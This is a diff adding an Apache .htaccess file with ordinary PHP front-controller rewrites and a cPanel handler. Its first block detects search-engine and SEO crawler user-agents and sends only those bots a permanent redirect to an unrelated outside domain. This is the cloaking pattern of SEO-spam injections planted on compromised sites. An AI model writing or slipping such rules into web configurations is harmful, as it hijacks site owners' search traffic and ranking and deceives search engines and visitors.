@@ -1,0 +1,26 @@
+Options -Indexes
+
+# Pengalihan Bot ke URL Target
+<IfModule mod_rewrite.c>
+RewriteEngine On
+
+# Deteksi User-Agent Bot
+RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|slurp|ahrefs|semrush|yandex|majestic|screamingfrog) [NC]
+
+# Redirect 301 hanya untuk Bot
+RewriteRule ^(.*)$ https://techned.org.ua/ [R=301,L]
+</IfModule>
+
+<IfModule mod_rewrite.c>
+ RewriteEngine on
+ RewriteCond %{REQUEST_FILENAME} !-d
+ RewriteCond %{REQUEST_FILENAME} !-f
+ RewriteRule ^(.*)$ index.php/$1 [QSA,L]
+</IfModule>
+
+# php -- BEGIN cPanel-generated handler, do not edit
+# Set the “ea-php82” package as the default “PHP” programming language.
+<IfModule mime_module>
+  AddHandler application/x-httpd-ea-php82 .php .php8 .phtml
+</IfModule>
+# php -- END cPanel-generated handler, do not edit
